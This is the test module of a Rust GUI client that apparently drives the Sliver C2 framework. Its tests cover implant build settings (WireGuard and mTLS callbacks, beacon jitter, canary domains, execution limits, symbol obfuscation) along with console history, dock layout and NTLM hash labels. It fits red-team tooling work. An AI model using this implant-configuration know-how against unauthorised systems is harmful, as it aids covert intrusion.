            transport: generator::Transport::Wg, wg: "192.0.2.10:8889".into(), mtls: "192.0.2.10:8888".into(),
            wg_key_port: 2000, wg_comms_port: 9000, ..Default::default()
        };
        let (c, _, _) = build_generate_request(&f);
        let urls: Vec<&str> = c.c2.iter().map(|x| x.url.as_str()).collect();
        assert_eq!(urls, vec!["wg://192.0.2.10:8889", "mtls://192.0.2.10:8888"], "listener first, fallbacks after");
        assert_eq!((c.c2[0].priority, c.c2[1].priority), (0, 1));
        assert_eq!((c.wg_key_exchange_port, c.wg_tcp_comms_port), (2000, 9000));
        // Loading it back picks WireGuard as the listener type again.
        let g = builds::form_from_config(&c, String::new());
        assert_eq!(g.transport, generator::Transport::Wg);
        assert_eq!((g.wg_key_port, g.wg_comms_port), (2000, 9000));
    }

    #[test]
    fn generate_request_minimal_defaults() {
        let f = GenerateForm { mtls: "203.0.113.4:443".into(), c2_profile: String::new(), ..Default::default() };
        let (c, _, _) = build_generate_request(&f);
        assert_eq!(c.c2.len(), 1);
        assert!(!c.include_wg && !c.include_tcp && !c.include_name_pipe);
        assert_eq!(c.wg_key_exchange_port, 0);
        assert_eq!(c.httpc2_config_name, "default");
        assert!(c.canary_domains.is_empty());
    }

    #[test]
    fn wireguard_build_is_never_obfuscated() {
        // Symbol obfuscation breaks WG implants (upstream garble bug), so a WG build must
        // come out non-obfuscated even when obfuscation was requested — on every OS.
        for os in ["windows", "linux"] {
            let f = GenerateForm { os: os.into(), transport: generator::Transport::Wg,
                wg: "198.51.100.5:51820".into(), obfuscate_symbols: true, ..Default::default() };
            let (c, _, _) = build_generate_request(&f);
            assert!(c.include_wg);
            assert!(!c.obfuscate_symbols, "{os} WG implants must never be symbol-obfuscated");
        }
        // The guard is WG-specific: a non-WG build keeps the requested obfuscation.
        let f = GenerateForm { transport: generator::Transport::Mtls, mtls: "198.51.100.5:8888".into(),
            obfuscate_symbols: true, ..Default::default() };
        let (c, _, _) = build_generate_request(&f);
        assert!(c.obfuscate_symbols, "non-WG builds keep the requested obfuscation");
    }

    #[test]
    fn profile_round_trips_through_generator_form() {
        let f = GenerateForm {
            os: "windows".into(), arch: "amd64".into(), format: 1, is_beacon: true,
            beacon_interval: 45, beacon_jitter: 7, mtls: "198.51.100.5:8888".into(), wg: "198.51.100.5:53".into(),
            tcp_pivot: "198.51.100.11:9898".into(), c2_profile: "custom".into(), canary: "x.canary.com".into(),
            limit_hostname: "h".into(), limit_username: "u".into(), limit_datetime: "2027-01-01T00:00:00Z".into(),
            sc_entropy: 2, sc_compress: 2,
            ..Default::default()
        };
        let (cfg, _, _) = build_generate_request(&f);
        let g = builds::form_from_config(&cfg, f.save_dir.clone());
        let (cfg2, _, _) = build_generate_request(&g);
        assert_eq!(cfg, cfg2, "form → config → form → config must be stable");
        assert_eq!((g.beacon_interval, g.beacon_jitter), (45, 7));
        assert_eq!(g.tcp_pivot, "198.51.100.11:9898");
    }

    #[test]
    fn console_history_navigation() {
        let mut c = ConsoleState::default();
        for l in ["ls", "pwd", "pwd", "cd /tmp"] { c.remember(l); }
        assert_eq!(c.history, vec!["ls", "pwd", "cd /tmp"], "consecutive duplicates collapse");
        assert!(c.browse_history(true));
        assert_eq!(c.input, "cd /tmp");
        c.browse_history(true);
        c.browse_history(true);
        assert_eq!(c.input, "ls");
        c.browse_history(true);
        assert_eq!(c.input, "ls", "stops at oldest");
        c.browse_history(false);
        assert_eq!(c.input, "pwd");
        c.browse_history(false);
        c.browse_history(false);
        assert_eq!(c.input, "", "past newest clears the line");
        assert!(!c.browse_history(false));
    }

    #[test]
    fn ring_cards_do_not_overlap() {
        let pane = egui::Rect::from_min_size(egui::pos2(0.0, 0.0), egui::vec2(1400.0, 320.0));
        let card = egui::vec2(176.0, 52.0);
        let (center, radii) = (pane.center(), egui::vec2(612.0, 120.0));
        let mut placed: Vec<egui::Pos2> = Vec::new();
        for i in 0..9 {
            let ang = std::f32::consts::TAU * i as f32 / 9.0 - std::f32::consts::FRAC_PI_2;
            placed.push(ring_spot(ang, center, radii, card, pane, &placed).expect("a free spot"));
        }
        for (i, a) in placed.iter().enumerate() {
            assert!(pane.contains_rect(egui::Rect::from_center_size(*a, card)), "card {i} inside the pane");
            for b in &placed[i + 1..] {
                assert!(!egui::Rect::from_center_size(*a, card).intersects(egui::Rect::from_center_size(*b, card)), "cards overlap");
            }
        }
    }

    #[test]
    fn elide_text() {
        assert_eq!(elide("short", 10), "short");
        assert_eq!(elide("WORKSTATION-02\\Operator  ·  windows/amd64", 12).chars().count(), 12);
        assert!(elide("abcdefghijklmnop", 5).ends_with('…'));
    }

    #[test]
    fn dock_layout_restores_and_drops_dynamic_tabs() {
        let mut d = default_dock(None);
        d.push_to_focused_leaf(Tab::Console(Target::session("abc")));
        d.push_to_focused_leaf(Tab::Processes(Target::session("abc")));
        let saved = d.filter_map_tabs(|t| t.is_permanent().then(|| t.clone()));
        let v = serde_json::to_value(&saved).unwrap();
        let back = restore_dock(v).expect("restorable");
        for (_, node) in back.main_surface().iter().enumerate() {
            if let egui_dock::Node::Leaf { tabs, active, .. } = node { assert!(active.0 < tabs.len().max(1), "active index in range"); }
        }
        let tabs: Vec<Tab> = back.iter_all_tabs().map(|(_, t)| t.clone()).collect();
        assert!(tabs.iter().all(|t| t.is_permanent()));
        for t in TOP_TABS.iter().chain(BOTTOM_TABS.iter()) { assert!(tabs.contains(t), "missing permanent tab"); }
        // A layout missing newer panels gets them re-added.
        let mut old = DockState::new(vec![Tab::Sessions]);
        old.main_surface_mut().split_below(NodeIndex::root(), 0.5, vec![Tab::Jobs]);
        let back = restore_dock(serde_json::to_value(&old).unwrap()).unwrap();
        assert_eq!(back.iter_all_tabs().count(), TOP_TABS.len() + BOTTOM_TABS.len());
        // A new panel lands right after its default neighbour, without stealing focus.
        let mut old = DockState::new(vec![Tab::Sessions]);
        old.main_surface_mut().split_below(NodeIndex::root(), 0.5, vec![Tab::ServerCli, Tab::Jobs, Tab::Events]);
        let back = restore_dock(serde_json::to_value(&old).unwrap()).unwrap();
        let (sf, nd, idx) = back.find_tab(&Tab::Jobs).unwrap();
        let cli = back.find_tab(&Tab::ServerCli).unwrap().2.0;
        // Local Terminal goes directly next to the Sliver Console, the rest after it.
        assert_eq!(back.find_tab(&Tab::LocalTerm).unwrap().2.0, cli + 1);
        assert_eq!(cli + 2, idx.0);
        if let egui_dock::Node::Leaf { tabs, active, .. } = &back[sf][nd] { assert!(tabs[active.0] == Tab::ServerCli); }
        // A layout with Local Terminal left of the Sliver Console is put right; the
        // active tab stays active.
        let mut old = DockState::new(vec![Tab::Sessions]);
        old.main_surface_mut().split_below(NodeIndex::root(), 0.5, vec![Tab::LocalTerm, Tab::ServerCli, Tab::Jobs]);
        let back = restore_dock(serde_json::to_value(&old).unwrap()).unwrap();
        let (sf2, nd2, cli) = back.find_tab(&Tab::ServerCli).unwrap();
        assert_eq!(back.find_tab(&Tab::LocalTerm).unwrap().2.0, cli.0 + 1);
        if let egui_dock::Node::Leaf { tabs, active, .. } = &back[sf2][nd2] { assert!(tabs[active.0] == Tab::LocalTerm); }
        // The dev focus hook keeps the default order.
        let d = default_dock(Some(&Tab::LocalTerm));
        let (s3, n3, i3) = d.find_tab(&Tab::LocalTerm).unwrap();
        assert_eq!(i3.0, d.find_tab(&Tab::ServerCli).unwrap().2.0 + 1);
        if let egui_dock::Node::Leaf { tabs, active, .. } = &d[s3][n3] { assert!(tabs[active.0] == Tab::LocalTerm); }
        // A layout saved with the old, now-removed "Beacons" tab still restores.
        let mut old = DockState::new(vec![Tab::Sessions]);
        old.main_surface_mut().split_below(NodeIndex::root(), 0.5, vec![Tab::Jobs]);
        let mut v = serde_json::to_value(&old).unwrap();
        // Splice the removed "Beacons" and "SliverConsole" string tabs into the first leaf.
        fn inject_removed(v: &mut serde_json::Value) -> bool {
            if let serde_json::Value::Object(m) = v {
                if let Some(serde_json::Value::Array(tabs)) = m.get_mut("tabs") {
                    tabs.push(serde_json::Value::String("Beacons".into()));
                    tabs.push(serde_json::Value::String("SliverConsole".into()));
                    return true;
                }
                return m.values_mut().any(inject_removed);
            }
            if let serde_json::Value::Array(a) = v { return a.iter_mut().any(inject_removed); }
            false
        }
        assert!(inject_removed(&mut v));
        let back = restore_dock(v).expect("old Beacons/SliverConsole layout still restores");
        let tabs: Vec<Tab> = back.iter_all_tabs().map(|(_, t)| t.clone()).collect();
        assert_eq!(back.iter_all_tabs().count(), TOP_TABS.len() + BOTTOM_TABS.len());
        assert!(tabs.contains(&Tab::Sessions));
        // Garbage → None (caller falls back to the default layout).
        assert!(restore_dock(serde_json::json!({"nope": 1})).is_none());
    }

    #[test]
    fn hash_type_labels() {
        assert_eq!(collect::hash_type_name(1000), "NTLM");
        assert_eq!(collect::hash_type_name(-1), "plaintext");
        assert_eq!(collect::hash_type_name(5600), "NetNTLMv2");
        assert!(collect::hash_type_name(17400).contains("SHA3"));
    }
}
